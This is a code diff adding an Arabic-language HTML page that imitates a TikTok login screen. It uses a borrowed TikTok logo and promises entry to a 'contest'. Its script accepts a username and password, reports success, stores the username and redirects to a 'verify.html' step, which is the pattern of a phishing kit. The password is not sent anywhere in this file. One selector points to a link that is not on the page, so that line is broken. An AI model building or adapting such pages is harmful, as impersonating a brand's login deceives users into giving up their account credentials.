@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول تيك توك</title>
+    <link rel="icon" href="https://png.klev.club/uploads/posts/2024-04/png-klev-club-e5j9-p-tik-tok-znachok-png-1.png"/>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --font-family: 'Cairo', sans-serif;
+        }
+        
+        .alert {
+            display: none;
+            background-color: #ffeaea;
+            color: #d8000c;
+            padding: 12px;
+            border-radius: 6px;
+            margin-top: 15px;
+            text-align: center;
+            border: 1px solid #ffbaba;
+            font-size: 0.9rem;
+        }
+        
+        .alert.show {
+            display: block;
+            animation: fadeIn 0.3s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .btn-primary.loading {
+            background-color: #d60043;
+            cursor: not-allowed;
+        }
+        
+        .btn-primary.loading::after {
+            content: " جارٍ التوجيه...";
+            margin-right: 5px;
+        }
+        
+        .login-container {
+            animation: fadeIn 0.5s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="header">
+            <img src="https://i.pinimg.com/736x/e3/46/b3/e346b3d9d66ad28baf1033b97e64e9e8.jpg" alt="TikTok Logo"
+                class="logo-img">
+            <h2 class="title">تسجيل الدخول</h2>
+            <p class="subtitle">قم بالدخول للمتابعة إلى المسابقة</p>
+        </div>
+
+        <form id="loginForm" action="#" method="POST">
+            <div class="form-group">
+                <label for="username" class="form-label">اسم المستخدم أو البريد الإلكتروني</label>
+                <input type="text" id="username" name="username" class="form-input" placeholder="example@email.com"
+                    required>
+            </div>
+
+            <div class="form-group">
+                <label for="password" class="form-label">كلمة المرور</label>
+                <input type="password" id="password" name="password" class="form-input" placeholder="********" required>
+            </div>
+
+            <button type="submit" class="btn-primary" id="loginButton">تسجيل الدخول</button>
+            
+            <div class="alert" id="loginAlert"></div>
+        </form>
+
+        <div class="links">
+            <a href="index .html">العودة إلى المسابقة</a>
+            <div>
+                <span style="color: var(--gray-med);">ليس لديك حساب؟</span>
+                <a href="#" class="signup-link">سجل الآن</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginForm = document.getElementById('loginForm');
+            const loginButton = document.getElementById('loginButton');
+            const loginAlert = document.getElementById('loginAlert');
+            
+            loginForm.addEventListener('submit', function(event) {
+                event.preventDefault();
+                
+                const username = document.getElementById('username').value.trim();
+                const password = document.getElementById('password').value;
+                
+                if (!username || !password) {
+                    showAlert('يرجى ملء جميع الحقول', 'error');
+                    return;
+                }
+                
+                if (username.length < 3) {
+                    showAlert('اسم المستخدم يجب أن يكون 3 أحرف على الأقل', 'error');
+                    return;
+                }
+                
+                if (password.length < 6) {
+                    showAlert('كلمة المرور يجب أن تكون 6 أحرف على الأقل', 'error');
+                    return;
+                }
+                
+                if (username.includes('@')) {
+                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                    if (!emailRegex.test(username)) {
+                        showAlert('صيغة البريد الإلكتروني غير صحيحة', 'error');
+                        return;
+                    }
+                }
+                
+                showAlert('تم تسجيل الدخول بنجاح! يتم التوجيه إلى صفحة التحقق...', 'success');
+                
+                loginButton.disabled = true;
+                loginButton.classList.add('loading');
+                
+                setTimeout(function() {
+                    localStorage.setItem('tiktok_username', username);
+                    window.location.href = 'verify.html';
+                }, 2000);
+            });
+            
+            function showAlert(message, type) {
+                loginAlert.textContent = message;
+                loginAlert.className = 'alert show';
+                
+                if (type === 'success') {
+                    loginAlert.style.backgroundColor = '#e7f7e7';
+                    loginAlert.style.color = '#2d8515';
+                    loginAlert.style.borderColor = '#b7e1b7';
+                } else if (type === 'error') {
+                    loginAlert.style.backgroundColor = '#ffeaea';
+                    loginAlert.style.color = '#d8000c';
+                    loginAlert.style.borderColor = '#ffbaba';
+                }
+                
+                setTimeout(function() {
+                    loginAlert.classList.remove('show');
+                }, 5000);
+            }
+            
+            // إضافة رابط للعودة إلى المسابقة
+            document.querySelector('.links a[href="contest.html"]').addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.href = 'contest.html';
+            });
+        });
+    </script>
+
+</body>
+</html>
